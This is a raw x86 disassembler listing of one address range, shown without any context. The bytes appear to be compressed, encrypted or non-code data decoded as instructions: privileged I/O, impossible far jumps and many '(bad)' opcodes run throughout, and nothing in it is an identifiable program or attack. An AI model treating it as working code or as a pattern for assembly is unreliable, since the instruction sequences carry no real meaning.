  40e430:	mov    esp,DWORD PTR [edi-0x6b]
  40e433:	std    
  40e434:	or     DWORD PTR [esi+edi*1-0x3f222534],eax
  40e43b:	pop    eax
  40e43c:	xchg   esp,eax
  40e43d:	add    al,0x14
  40e43f:	xchg   edx,eax
  40e440:	pushf  
  40e441:	frstor [ebx+0x32e5ea3d]
  40e447:	test   al,0x14
  40e449:	fsubr  QWORD PTR [ebp+ebp*8+0x47]
  40e44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e44e:	ficomp WORD PTR [esi]
  40e450:	sub    DWORD PTR [edx-0xf],ebp
  40e453:	mov    esp,0xb089ee1f
  40e458:	mov    dl,0x8
  40e45a:	inc    esi
  40e45b:	push   eax
  40e45c:	ins    DWORD PTR es:[edi],dx
  40e45d:	mov    al,ds:0xb5012ea8
  40e462:	inc    esp
  40e463:	jg     0x40e40f
  40e465:	scas   al,BYTE PTR es:[edi]
  40e466:	jl     0x40e3f5
  40e468:	and    DWORD PTR [edx-0x55],esp
  40e46b:	setnp  BYTE PTR [edi-0x5a2b5185]
  40e472:	ret    0xbb3c
  40e475:	dec    edi
  40e476:	das    
  40e477:	mov    ds:0x921cc2ac,al
  40e47c:	gs clc 
  40e47e:	pushf  
  40e47f:	fidiv  DWORD PTR [esi-0x4ede39fc]
  40e485:	jmp    0x2c2e2745
  40e48a:	xor    ebp,edi
  40e48c:	test   eax,0xa14e9c46
  40e491:	sub    DWORD PTR [edx],ebx
  40e493:	shl    cl,0xec
  40e496:	ds ja  0x40e4c2
  40e499:	mov    esp,0x30d3ac28
  40e49e:	xchg   esi,eax
  40e49f:	das    
  40e4a0:	nop
  40e4a1:	inc    ebx
  40e4a2:	aad    0x4e
  40e4a4:	repz in eax,0x72
  40e4a7:	enter  0x5f83,0xd7
  40e4ab:	(bad)  
  40e4ac:	dec    edi
  40e4ae:	mov    WORD PTR [esi+ebp*4],gs
  40e4b1:	add    eax,0xf51bc9d
  40e4b6:	imul   esp,DWORD PTR [ebx+0x2aa586f1],0x9e931333
  40e4c0:	into   
  40e4c1:	pop    ss
  40e4c2:	cmp    esp,ebp
  40e4c4:	xchg   edi,eax
  40e4c5:	(bad)  
  40e4c6:	pop    esi
  40e4c7:	pop    es
  40e4c8:	cmc    
  40e4c9:	adc    al,0xf9
  40e4cb:	(bad)  
  40e4cc:	sub    DWORD PTR [ebp+0x3f],ecx
  40e4cf:	dec    edx
  40e4d0:	sub    eax,0x26a4039
  40e4d5:	stos   DWORD PTR es:[edi],eax
  40e4d6:	fsub   QWORD PTR [edi+0x1897a17a]
  40e4dc:	cld    
  40e4dd:	daa    
  40e4de:	sar    ch,1
  40e4e0:	out    dx,eax
  40e4e1:	adc    al,0xf4
  40e4e3:	xor    bh,BYTE PTR [eax-0x75]
  40e4e6:	loop   0x40e4fc
  40e4e8:	mov    edi,0x2021c163
  40e4ed:	mov    al,0x20
  40e4ef:	repnz clc 
  40e4f1:	sbb    eax,0x8e28ccba
  40e4f6:	in     al,dx
  40e4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4f8:	(bad)
  40e4fb:	push   cs
  40e4fc:	cmp    eax,edx
  40e4fe:	cs xor eax,0x7f6f8173
  40e504:	fldenv [edi-0x503ec0c7]
  40e50a:	push   ebp
  40e50b:	retf   0x843e
  40e50e:	leave  
  40e50f:	or     al,0xe
  40e511:	push   0xad82f469
  40e516:	imul   ebp,esi,0xd4e509b8
  40e51c:	in     eax,0x52
  40e51e:	mov    eax,ds:0xb1f47823
  40e523:	mov    ds,WORD PTR [edi-0x2]
  40e526:	and    BYTE PTR [edx+eax*4-0x7a2cf698],dh
  40e52d:	cmp    DWORD PTR ds:0x742915b2,eax
  40e534:	or     ebx,edi
  40e536:	call   0xd496787b
  40e53b:	nop
  40e53c:	(bad)  
  40e53d:	call   0xceacc5aa
  40e542:	xchg   ecx,eax
  40e543:	jg     0x40e5a2
  40e545:	cmp    ecx,DWORD PTR [ecx]
  40e547:	mov    edi,0xf256da44
  40e54c:	jl     0x40e512
  40e54e:	xor    eax,0x9beb33e0
  40e553:	sbb    DWORD PTR [ebx+ebp*1+0x35],edx
  40e557:	pop    ss
  40e558:	arpl   WORD PTR [edx+0x56d1b8e9],bx
  40e55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e55f:	sub    al,ch
  40e561:	jmp    0x1d147f91
  40e566:	imul   DWORD PTR [ebp-0x6c]
  40e569:	popf   
  40e56a:	add    DWORD PTR [eax],eax
  40e56c:	iret   
  40e56d:	imul   ebx,DWORD PTR cs:[ebx-0x55],0xd81a1051
  40e575:	mov    es,WORD PTR [ebp-0x7b]
  40e578:	or     al,0x5
  40e57a:	in     eax,0xf3
  40e57c:	stos   DWORD PTR es:[edi],eax
  40e57d:	jl     0x40e596
  40e57f:	jb     0x40e543
  40e581:	out    0x94,al
  40e583:	jbe    0x40e596
  40e585:	rcl    esi,1
  40e587:	pop    es
  40e588:	cmp    esp,DWORD PTR [edx]
  40e58a:	loopne 0x40e544
  40e58c:	sub    al,0x45
  40e58e:	mov    ah,BYTE PTR [edx+ebp*8]
  40e591:	pop    eax
  40e592:	cld    
  40e593:	rol    dl,1
  40e595:	in     eax,0x4a
  40e597:	bound  eax,QWORD PTR [edx+edi*2+0x2f530850]
  40e59e:	lods   eax,DWORD PTR ds:[esi]
  40e59f:	in     al,0xc6
  40e5a1:	test   eax,0x301e3f98
  40e5a6:	aas    
  40e5a7:	cmc    
  40e5a8:	and    al,0xcf
  40e5aa:	jns    0x40e52e
  40e5ac:	popf   
  40e5ad:	(bad)  
  40e5ae:	ret    
  40e5af:	jns    0x40e611
  40e5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b2:	mov    esp,0xa8a8b905
  40e5b7:	pop    ebx
  40e5b8:	pushf  
  40e5b9:	fsubr  st,st(5)
  40e5bb:	mov    gs,WORD PTR [ecx]
  40e5bd:	cld    
  40e5be:	stos   BYTE PTR es:[edi],al
  40e5bf:	scas   al,BYTE PTR es:[edi]
  40e5c0:	push   es
  40e5c1:	into   
  40e5c2:	add    eax,0xde9bf9b4
  40e5c7:	fimul  WORD PTR [eax+0x28b59eb3]
  40e5cd:	sti    
  40e5ce:	aam    0xfa
  40e5d0:	ja     0x40e645
  40e5d2:	je     0x40e57d
  40e5d4:	mov    edx,0x92b95dfb
  40e5d9:	jp     0x40e5c1
  40e5db:	out    dx,al
  40e5dc:	and    BYTE PTR [ebp+0x5806ffa0],cl
  40e5e2:	(bad)  
  40e5e3:	cs jp  0x40e5d4
  40e5e6:	push   0x826debf9
  40e5eb:	cmp    bh,BYTE PTR [eax-0x7b]
  40e5ee:	lods   al,BYTE PTR ds:[esi]
  40e5ef:	pop    ebp
  40e5f0:	pusha  
  40e5f1:	iret   
  40e5f2:	pop    es
  40e5f3:	jbe    0x40e584
  40e5f5:	cld    
  40e5f6:	cdq    
  40e5f7:	xor    edx,DWORD PTR gs:[edx-0x2c]
  40e5fb:	push   esi
  40e5fc:	fistp  QWORD PTR [edx]
  40e5fe:	cmp    DWORD PTR [ebx],ecx
  40e600:	or     edi,ecx
  40e602:	sti    
  40e603:	pop    esp
  40e604:	push   ecx
  40e605:	jns    0x40e60f
  40e607:	mov    edi,DWORD PTR [ecx]
  40e609:	cli    
  40e60a:	data16 aaa 
  40e60c:	pop    esi
  40e60d:	xor    BYTE PTR [ebx+eiz*4-0x239cd477],0x44
  40e615:	fmul   st,st(0)
  40e617:	dec    ecx
  40e618:	retf   
  40e619:	cs push cs
  40e61b:	ins    DWORD PTR es:[edi],dx
  40e61c:	xlat   BYTE PTR ds:[ebx]
  40e61d:	ret    0xf203
  40e620:	xor    DWORD PTR [esi],ebp
  40e622:	popa   
  40e623:	lds    ebx,FWORD PTR [edx]
  40e625:	jbe    0x40e684
  40e627:	pop    ss
  40e628:	sub    BYTE PTR [edx+ebp*4-0x3b084c3],ah
  40e62f:	cmp    al,0x2e
  40e631:	sar    eax,cl
  40e633:	xor    edx,0x23
  40e636:	loop   0x40e6b6
  40e638:	aad    0xd4
  40e63a:	xor    eax,0xc800612f
  40e63f:	jmp    FWORD PTR [ecx-0x61fe9204]
  40e645:	jns    0x40e624
  40e647:	or     al,0xf1
  40e649:	clc    
  40e64a:	dec    ebx
  40e64b:	adc    BYTE PTR [esi+0x3f],0xdb
  40e64f:	pusha  
  40e650:	pop    edi
  40e651:	adc    ebx,DWORD PTR [ecx+0x4]
  40e654:	and    eax,0x863da1e2
  40e659:	hlt    
  40e65a:	nop
  40e65b:	pop    esi
  40e65c:	xor    DWORD PTR [ebx-0x29496bc6],0x2b
  40e663:	xor    ecx,DWORD PTR [edi+0x22]
  40e666:	and    eax,0x185d317e
  40e66b:	mov    DWORD PTR [ecx+0x9],edx
  40e66e:	in     eax,0x7f
  40e670:	mov    edi,0x26a6470e
  40e675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e676:	cmp    eax,0xb125b26f
  40e67b:	inc    ebx
  40e67c:	dec    edx
  40e67d:	mov    ah,0x65
  40e67f:	sub    DWORD PTR [ecx-0x31add991],esp
  40e685:	sub    edi,edi
  40e687:	clc    
  40e688:	cmp    eax,0xf5756e18
  40e68d:	cmp    eax,0x72a81c06
  40e692:	aad    0xf3
  40e694:	lock lahf 
  40e696:	iret   
  40e697:	push   cs
  40e698:	loopne 0x40e6f3
  40e69a:	adc    ebp,DWORD PTR ds:[eax-0x5aa74dc2]
  40e6a1:	and    eax,0x39b906ce
  40e6a6:	dec    esp
  40e6a7:	cmp    eax,0xf8c4bf6b
  40e6ac:	mov    cs,WORD PTR [edx]
  40e6ae:	loope  0x40e660
  40e6b0:	push   ebp
  40e6b1:	fild   QWORD PTR [ebp+esi*2+0x5d540db2]
  40e6b8:	fwait
  40e6b9:	jo     0x40e687
  40e6bb:	jecxz  0x40e6d5
  40e6bd:	adc    ebp,DWORD PTR [edi]
  40e6bf:	outs   dx,BYTE PTR ds:[esi]
  40e6c0:	nop
  40e6c1:	cmp    BYTE PTR [edx-0x23],ah
  40e6c4:	mov    esp,0x26f66b2b
  40e6c9:	add    al,ah
  40e6cb:	popa   
  40e6cc:	cs enter 0x5441,0x12
  40e6d1:	arpl   WORD PTR [ebx-0x47],dx
  40e6d4:	xlat   BYTE PTR ds:[ebx]
  40e6d5:	mov    DWORD PTR [edi-0x787c0212],0xb0524321
  40e6df:	es hlt 
  40e6e1:	dec    eax
  40e6e2:	or     al,0xf4
  40e6e4:	aaa    
  40e6e5:	mov    ecx,0x555bc945
  40e6ea:	mov    ebp,0x76a06f40
  40e6ef:	mov    ch,0xfb
  40e6f1:	(bad)  
  40e6f2:	idiv   DWORD PTR [ebx]
  40e6f4:	mov    ecx,0x91cdd971
  40e6f9:	sub    DWORD PTR [ebx-0x9547706],0x702b1e3f
  40e703:	xchg   edi,eax
  40e704:	mov    ah,bl
  40e706:	mov    cl,0xd
  40e708:	adc    edi,edi
  40e70a:	sub    al,0xdf
  40e70c:	inc    eax
  40e70d:	in     al,0x5b
  40e70f:	ds retf 
  40e711:	stos   DWORD PTR es:[edi],eax
  40e712:	and    al,0x67
  40e714:	fs nop
  40e716:	fcomip st,st(5)
  40e718:	aaa    
  40e719:	pop    es
  40e71a:	in     eax,dx
  40e71b:	xchg   BYTE PTR [ecx],bl
  40e71d:	pop    ds
  40e71e:	cmp    edx,DWORD PTR [ebx+ebx*4+0x26]
  40e722:	or     BYTE PTR [edx+0x5f23d996],cl
  40e728:	call   0x1eeed2d2
  40e72d:	jns    0x40e736
  40e72f:	test   BYTE PTR [edi+ebp*2-0x3eb76253],cl
  40e736:	xlat   BYTE PTR ds:[ebx]
  40e737:	pop    ebx
  40e738:	gs push ds
  40e73a:	and    al,0x5d
  40e73c:	aad    0x78
  40e73e:	cmp    esi,ebx
  40e740:	dec    edx
  40e741:	mov    edi,0x4e995602
  40e746:	das    
  40e747:	inc    ebx
  40e748:	dec    eax
  40e749:	test   eax,0x3c551865
  40e74e:	sbb    ch,BYTE PTR [ebp+0x20]
  40e751:	in     eax,0x5a
  40e753:	hlt    
  40e754:	mov    bl,0x48
  40e756:	pop    ebx
  40e757:	jns    0x40e751
  40e759:	mov    edx,0x212181d5
  40e75e:	jge    0x40e72a
  40e760:	mov    ds:0xf16e8e96,al
  40e765:	push   ss
  40e766:	je     0x40e79c
  40e768:	inc    edi
  40e769:	xchg   edi,eax
  40e76a:	and    ah,cl
  40e76c:	mov    esp,0x1a7f9b0d
  40e771:	sub    dl,BYTE PTR [ecx]
  40e773:	in     al,0x72
  40e775:	jmp    0x40e7e6
  40e777:	rcr    DWORD PTR [ebx],cl
  40e779:	inc    ecx
  40e77a:	push   esi
  40e77b:	mov    DWORD PTR [ecx],eax
  40e77d:	test   DWORD PTR [edx-0x28082bcd],ebp
  40e783:	jp     0x40e756
  40e785:	lea    edi,[eax]
  40e787:	and    eax,0x736e464e
  40e78c:	aad    0x83
  40e78e:	jo     0x40e741
  40e790:	pop    esi
  40e791:	and    ch,ch
  40e793:	lea    esi,[edi+0x7a]
  40e796:	jne    0x40e7ca
  40e798:	adc    ebx,DWORD PTR [eax+0x29]
  40e79b:	cmp    eax,0x8efe270c
  40e7a0:	fistp  QWORD PTR [ebp+0x5c]
  40e7a3:	and    DWORD PTR [esi-0x6da64683],eax
  40e7a9:	aad    0xaa
  40e7ab:	push   ds
  40e7ac:	mov    dl,0xf
  40e7ae:	xchg   BYTE PTR [ebp-0x4b6be1ea],cl
  40e7b4:	(bad)  
  40e7b5:	fld    DWORD PTR [edi]
  40e7b7:	xchg   esi,eax
  40e7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7b9:	in     al,dx
  40e7ba:	repz (bad) 
  40e7bc:	dec    ebp
  40e7bd:	push   ds
  40e7be:	sar    DWORD PTR [edi+0x64],1
  40e7c1:	jmp    0xd1cea5b6
  40e7c6:	popf   
  40e7c7:	pop    ecx
  40e7c8:	shl    BYTE PTR [ebx+0x69],cl
  40e7cb:	rcr    BYTE PTR [edi-0x76],0x10
  40e7cf:	pop    esp
  40e7d0:	dec    eax
  40e7d1:	mov    al,ds:0x17fc96cc
  40e7d6:	push   ecx
  40e7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d8:	bound  ecx,QWORD PTR [ebx]
  40e7da:	push   ecx
  40e7db:	in     eax,0xb8
  40e7dd:	repz mul BYTE PTR [esi+ebp*8-0x2b8a3238]
  40e7e5:	sub    esp,0x10
  40e7e8:	addr16 addr16 repz xchg ebx,eax
  40e7ec:	test   al,0x62
  40e7ee:	xchg   ecx,eax
  40e7ef:	add    ch,BYTE PTR [edi+0xe]
  40e7f2:	sar    DWORD PTR [eax+0x5a],1
  40e7f5:	imul   DWORD PTR [edi+eax*4]
  40e7f8:	loope  0x40e7c9
  40e7fa:	outs   dx,DWORD PTR ds:[esi]
  40e7fb:	mov    ecx,0x4c6dbb9f
  40e800:	bound  ecx,QWORD PTR [edx-0x3a792858]
  40e806:	js     0x40e7c2
  40e808:	pushf  
  40e809:	push   ebp
  40e80a:	out    dx,eax
  40e80b:	sub    al,0x4
  40e80d:	pop    esi
  40e80e:	pop    ss
  40e80f:	in     eax,dx
  40e810:	leave  
  40e811:	pop    esi
  40e812:	lock sub eax,0x283930a1
  40e818:	jo     0x40e896
  40e81a:	and    DWORD PTR [esi+0x7e2874ec],0x17852bc7
  40e824:	jnp    0x40e7c4
  40e826:	gs push 0xffffffcf
  40e829:	jmp    0xfaa04863
  40e82e:	cs nop
  40e830:	push   ebp
  40e831:	(bad)  
  40e832:	jno    0x40e8ab
  40e834:	mov    ecx,0x71aca52c
  40e839:	inc    esp
  40e83a:	bound  ebx,QWORD PTR [ebp+0x636cacbb]
  40e840:	jle    0x40e816
  40e842:	sbb    BYTE PTR [esi-0x5a],dh
  40e845:	jnp    0x40e83c
  40e847:	bound  ecx,QWORD PTR [ebp+0x69013abd]
  40e84d:	je     0x40e88e
  40e84f:	mov    al,0x89
  40e851:	dec    edx
  40e852:	add    BYTE PTR [edx],bh
  40e854:	(bad)  [edx]
  40e856:	imul   DWORD PTR [eax-0x4acdec63]
  40e85c:	es in  al,0xb9
  40e85f:	jl     0x40e88d
  40e861:	sub    DWORD PTR [eax+0x3d],esp
  40e864:	inc    edx
  40e865:	xchg   DWORD PTR [ebx],ebp
  40e867:	jne    0x40e840
  40e869:	daa    
  40e86a:	out    0xdb,eax
  40e86c:	scas   al,BYTE PTR es:[edi]
  40e86d:	push   edi
  40e86e:	inc    edx
  40e86f:	mov    eax,ds:0x63e20509
  40e874:	stos   BYTE PTR es:[edi],al
  40e875:	fs int 0x69
  40e878:	xor    BYTE PTR [esp+esi*4+0x72],0xe8
  40e87d:	add    DWORD PTR [edx+0x15],ebx
  40e880:	pop    ds
  40e881:	bound  esp,QWORD PTR [ebp-0x1a1fbab5]
  40e887:	arpl   bp,bp
  40e889:	adc    al,0x54
  40e88b:	mov    ds:0x30b4a6c9,al
  40e890:	(bad)  
  40e891:	adc    DWORD PTR [edi+0x36659317],edx
  40e897:	push   esi
  40e898:	push   edx
  40e899:	shl    ebx,1
  40e89b:	loopne 0x40e8d6
  40e89d:	jecxz  0x40e88b
  40e89f:	aad    0xdc
  40e8a1:	(bad)  
  40e8a3:	shr    ebx,0x5
  40e8a6:	or     bl,BYTE PTR [ebx+0x675e2fcf]
  40e8ac:	dec    edx
  40e8ad:	and    BYTE PTR [eax+edi*2+0x265dd65c],0x8
  40e8b5:	cwde   
  40e8b6:	adc    BYTE PTR [eax+0x19],cl
  40e8b9:	into   
  40e8ba:	mov    fs,ecx
  40e8bc:	xor    DWORD PTR [ebx+eiz*1-0x40],0x993447e2
  40e8c4:	(bad)  
  40e8c6:	push   0x3a
  40e8c8:	bound  esi,QWORD PTR [edx+0x7f]
  40e8cb:	in     eax,0xb2
  40e8cd:	icebp  
  40e8ce:	fld    st(6)
  40e8d0:	mov    edi,0x1c6450e8
  40e8d5:	or     eax,0x21569b76
  40e8da:	int3   
  40e8db:	xor    eax,0x926b77b3
  40e8e0:	push   edx
  40e8e1:	jg     0x40e8d5
  40e8e3:	nop
  40e8e4:	ror    BYTE PTR [esi-0x6e],cl
  40e8e7:	out    dx,eax
  40e8e8:	in     eax,0x42
  40e8ea:	int    0xe5
  40e8ec:	pop    edi
  40e8ed:	sbb    BYTE PTR [ebp-0x55d24c82],0xf3
  40e8f4:	adc    ebx,DWORD PTR [ebx-0x5]
  40e8f7:	and    al,0xe6
  40e8f9:	push   ecx
  40e8fa:	loope  0x40e8d2
  40e8fc:	mov    BYTE PTR [eax-0x4d],bh
  40e8ff:	push   0x7b2f05d3
  40e904:	cs retf 0xf912
  40e908:	(bad)  
  40e909:	cdq    
  40e90a:	push   0xac5bf080
  40e90f:	add    al,0x7b
  40e911:	xchg   ebx,eax
  40e912:	cmc    
  40e913:	daa    
  40e914:	ficom  WORD PTR [esp+ecx*4-0x50093827]
  40e91b:	out    0x23,eax
  40e91d:	push   esp
  40e91e:	xchg   ecx,eax
  40e91f:	add    BYTE PTR [edx-0x35],0xc
  40e923:	ins    BYTE PTR es:[edi],dx
  40e924:	jbe    0x40e901
  40e926:	mov    esi,0x632d42db
  40e92b:	add    eax,0xb903111e
  40e930:	ins    BYTE PTR es:[edi],dx
  40e931:	fdivr  QWORD PTR [ecx]
  40e933:	jbe    0x40e96d
  40e935:	or     DWORD PTR [eax+ebx*2],ecx
  40e938:	or     al,0x90
  40e93a:	outs   dx,DWORD PTR ds:[esi]
  40e93b:	sub    esp,DWORD PTR [eax-0x1f0ea4ec]
  40e941:	fadd   QWORD PTR [edx+0xa18eac0]
  40e947:	(bad)  
  40e948:	cmp    al,0x9a
  40e94a:	sub    BYTE PTR [ebx],bh
  40e94c:	ins    BYTE PTR es:[edi],dx
  40e94d:	int    0xa1
  40e94f:	icebp  
  40e950:	mov    ebx,0x628b269c
  40e955:	pop    ds
  40e956:	push   es
  40e957:	adc    ch,BYTE PTR ss:[esp+ebx*2+0x2a]
  40e95c:	bnd jbe 0x40e91f
  40e95f:	ins    BYTE PTR es:[edi],dx
  40e960:	dec    esp
  40e961:	sub    al,0x34
  40e963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e964:	dec    edx
  40e965:	mov    ecx,0x4f9465a9
  40e96a:	mov    ds:0x469d275e,al
  40e96f:	out    dx,al
  40e970:	jne    0x40e9ac
  40e972:	test   BYTE PTR [ecx],bh
  40e974:	test   BYTE PTR [eax],0xda
  40e977:	xor    eax,DWORD PTR [edi+0x445edc60]
  40e97d:	sbb    DWORD PTR [ecx-0x61fac1a9],edi
  40e983:	call   DWORD PTR [edi+0x21]
  40e986:	(bad)  
  40e987:	aaa    
  40e988:	lock pop es
  40e98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e98b:	add    DWORD PTR [ebx-0x4899babb],esp
  40e991:	adc    BYTE PTR [ecx],0xd6
  40e994:	xor    al,0x36
  40e996:	xchg   esi,eax
  40e997:	lods   eax,DWORD PTR ds:[esi]
  40e998:	inc    esi
  40e999:	cwde   
  40e99a:	pop    edx
  40e99b:	xchg   esp,eax
  40e99c:	lods   eax,DWORD PTR ds:[esi]
  40e99d:	adc    BYTE PTR [eax-0x589db83],0xfd
  40e9a4:	(bad)  
  40e9a5:	pop    esi
  40e9a6:	push   0xffffffb2
  40e9a8:	sbb    DWORD PTR [ebp-0xbabdd87],edi
  40e9ae:	div    DWORD PTR [ebx+0x26]
  40e9b1:	ret    0x37d2
  40e9b4:	mov    esi,0x10f73a4a
  40e9b9:	xchg   esi,eax
  40e9ba:	mov    esp,DWORD PTR [eax]
  40e9bc:	dec    edi
  40e9bd:	addr16 jae 0x40e9bf
  40e9c0:	inc    ebp
  40e9c1:	stos   BYTE PTR es:[edi],al
  40e9c2:	mov    ah,0x59
  40e9c4:	xchg   BYTE PTR [ecx-0x68b99b7],ah
  40e9ca:	jns    0x40e97d
  40e9cc:	(bad)  [eax+0x7e]
  40e9cf:	es loop 0x40e987
  40e9d2:	jns    0x40e9e7
  40e9d4:	pop    ebx
  40e9d5:	jbe    0x40ea31
  40e9d7:	adc    bh,BYTE PTR [esi+0x148c641e]
  40e9dd:	inc    edx
  40e9de:	mov    esp,0x2ece8d38
  40e9e3:	pop    edi
  40e9e4:	adc    al,0x4
  40e9e6:	cmp    eax,esi
  40e9e8:	(bad)  
  40e9e9:	ins    BYTE PTR es:[edi],dx
  40e9ea:	fwait
  40e9eb:	add    ebp,DWORD PTR [ebp+0x19ddfd80]
  40e9f1:	mov    eax,ds:0x4dcad810
  40e9f6:	jecxz  0x40e9cd
  40e9f8:	cli    
  40e9f9:	jle    0x40e9da
  40e9fb:	bound  ebx,QWORD PTR es:[edx-0x6cad418e]
  40ea02:	jmp    0xe76c86d2
  40ea07:	fidivr DWORD PTR [esi]
  40ea09:	repz push edi
  40ea0b:	cmp    DWORD PTR [eax+0x62],edx
  40ea0e:	cs mov ch,0x8d
  40ea11:	call   0xaf4:0x53ef2dc1
  40ea18:	cs xor al,0xf8
  40ea1b:	cmp    cl,dh
  40ea1d:	pop    ds
  40ea1e:	cs sahf 
  40ea20:	out    dx,al
  40ea21:	adc    ecx,DWORD PTR [edi-0x715fd610]
  40ea27:	es mov bh,0x1a
  40ea2a:	jb     0x40ea28
  40ea2c:	mov    DWORD PTR [eax+0x356f7dd8],ebp
  40ea32:	jmp    0x3cc3:0x324f5abd
  40ea39:	mov    BYTE PTR [eax-0x38df6339],cl
  40ea3f:	push   ecx
  40ea40:	push   edx
  40ea41:	mov    ds:0x23efb54f,al
  40ea46:	cmp    bh,BYTE PTR [edi]
  40ea48:	ds sub al,0x89
  40ea4b:	pop    ds
  40ea4c:	fcomp  DWORD PTR ds:[eax-0x55]
  40ea50:	popa   
  40ea51:	aad    0x61
  40ea53:	and    eax,0xde4cde60
  40ea58:	mov    WORD PTR [ebx],?
  40ea5a:	mov    edx,0xdb963b95
  40ea5f:	jne    0x40eac3
  40ea61:	jns    0x40ea45
  40ea63:	pop    ebp
  40ea64:	fld    DWORD PTR [esi-0x38]
  40ea67:	neg    DWORD PTR [ebp-0x2f02606]
  40ea6d:	mov    esp,0xfb8a73f8
  40ea72:	not    ebp
  40ea74:	push   esp
  40ea75:	les    esi,FWORD PTR [ebp+0xcc257f6]
  40ea7b:	pop    ebx
  40ea7c:	imul   eax,DWORD PTR [ecx+ebx*2],0x43
  40ea80:	cdq    
  40ea81:	mov    bh,0xd9
  40ea83:	push   ss
  40ea84:	jno    0x40ea99
  40ea86:	xor    eax,0xbe230f13
  40ea8c:	jb     0x40ea1c
  40ea8e:	pop    ecx
  40ea8f:	or     esp,0x6d37c83d
  40ea95:	mov    BYTE PTR [esi+0x5dfb7364],al
  40ea9b:	and    eax,0x624463ed
  40eaa0:	loope  0x40eaa2
  40eaa2:	inc    edi
  40eaa3:	popf   
  40eaa4:	imul   ebp,esi,0x7b
  40eaa7:	mov    ebx,0x1f9db74a
  40eaac:	push   ss
  40eaad:	fdivr  st,st(7)
  40eaaf:	inc    eax
  40eab0:	sbb    eax,0xacfea5c7
  40eab5:	fidiv  WORD PTR ds:0xa85eb5b0
  40eabb:	sub    al,0xc0
  40eabd:	inc    eax
  40eabe:	mov    bl,0xa3
  40eac0:	xor    eax,0x50f9b5a8
  40eac5:	je     0x40ea5b
  40eac7:	push   eax
  40eac8:	ss ds mov dh,0xbb
  40eacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eacd:	neg    BYTE PTR [edi]
  40eacf:	sub    eax,0xc57313c2
  40ead4:	ret    0xb5de
  40ead7:	(bad)  
  40ead8:	cli    
  40ead9:	mov    esp,0xd958c261
  40eade:	leave  
  40eadf:	jne    0x40eac4
  40eae1:	cwde   
  40eae2:	scas   al,BYTE PTR es:[edi]
  40eae3:	shl    bh,cl
  40eae5:	push   esp
  40eae6:	push   ebx
  40eae7:	ins    DWORD PTR es:[edi],dx
  40eae8:	push   ebp
  40eae9:	jns    0x40eae2
  40eaeb:	cs mov dl,0x5f
  40eaee:	adc    DWORD PTR [ebx],edx
  40eaf0:	(bad)  
  40eaf1:	jne    0x40eb40
  40eaf3:	mov    dl,0x5f
  40eaf5:	push   ebp
  40eaf6:	aam    0xa6
  40eaf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaf9:	pop    ebp
  40eafa:	pop    ebx
  40eafb:	and    ebp,ebx
  40eafd:	fcmovnbe st,st(5)
  40eaff:	pop    esi
  40eb00:	add    BYTE PTR [edx],0xad
  40eb03:	daa    
  40eb04:	xchg   ebx,eax
  40eb05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb06:	cmp    esi,esi
  40eb08:	pushf  
  40eb09:	dec    ecx
  40eb0a:	mov    ds:0x7679c211,eax
  40eb0f:	cld    
  40eb10:	out    0xde,al
  40eb12:	xor    eax,0x5b37f066
  40eb17:	out    dx,al
  40eb18:	jmp    0x7423:0xa1e3cd9c
  40eb1f:	or     eax,0xd7f0dfbc
  40eb24:	push   ss
  40eb25:	add    BYTE PTR [ebx+esi*1+0x21],bl
  40eb29:	enter  0x2d42,0x80
  40eb2d:	aam    0xf4
  40eb2f:	sbb    eax,0x3c8577e1
  40eb34:	ret    
  40eb35:	xchg   edi,eax
  40eb36:	xrelease mov BYTE PTR [esi-0x58393cb7],0x66
  40eb3e:	pop    ebx
  40eb3f:	je     0x40eb87
  40eb41:	popf   
  40eb42:	clc    
  40eb43:	mov    cs,WORD PTR [ebx]
  40eb45:	sbb    BYTE PTR [ebp+edx*4+0x412e1eb0],ah
  40eb4c:	in     al,0xf3
  40eb4e:	cmc    
  40eb4f:	xor    DWORD PTR [ecx],ebx
  40eb51:	xor    al,0xda
  40eb53:	pop    ss
  40eb54:	ds lahf 
  40eb56:	sub    eax,0xe479819c
  40eb5b:	xchg   ebp,eax
  40eb5c:	mov    al,ds:0xb990458b
  40eb61:	inc    ebx
  40eb62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb63:	ror    DWORD PTR [edx+ebx*1+0x3d554cb9],cl
  40eb6a:	and    edx,esi
  40eb6c:	nop
  40eb6d:	or     eax,0xa45adc82
  40eb72:	jmp    0x40ebed
  40eb74:	mov    dl,0xdb
  40eb76:	addr16 jb 0x40eb7b
  40eb79:	fdiv   DWORD PTR [ecx+0x36]
  40eb7c:	add    BYTE PTR [esi-0x3f50be20],dh
  40eb82:	(bad)  
  40eb84:	dec    esi
  40eb85:	pop    ss
  40eb86:	inc    esp
  40eb87:	mov    ah,0x6e
  40eb89:	int    0x89
  40eb8b:	push   es
  40eb8c:	ins    BYTE PTR es:[edi],dx
  40eb8d:	mov    ah,0x76
  40eb8f:	in     eax,dx
  40eb90:	and    ebp,DWORD PTR [esi-0x4c]
  40eb93:	and    ax,0x3ee5
  40eb97:	cmp    BYTE PTR [edi],bh
  40eb99:	jb     0x40eb79
  40eb9b:	popf   
  40eb9c:	xchg   ebx,eax
  40eb9d:	mov    DWORD PTR [eax+0x60301e13],0x852ee201
  40eba7:	cdq    
  40eba8:	adc    BYTE PTR [edi+0x4d],cl
  40ebab:	push   ss
  40ebac:	mov    edx,0x1b13d22d
  40ebb1:	in     eax,0x7f
  40ebb3:	cwde   
  40ebb4:	stc    
  40ebb5:	and    ah,0x74
  40ebb8:	out    0x0,eax
  40ebba:	mov    eax,0x619088ef
  40ebbf:	pop    esi
  40ebc0:	jecxz  0x40ec14
  40ebc2:	or     al,BYTE PTR [ecx]
  40ebc4:	popa   
  40ebc5:	out    0xa5,al
  40ebc7:	dec    eax
  40ebc8:	in     al,0x65
  40ebca:	push   ss
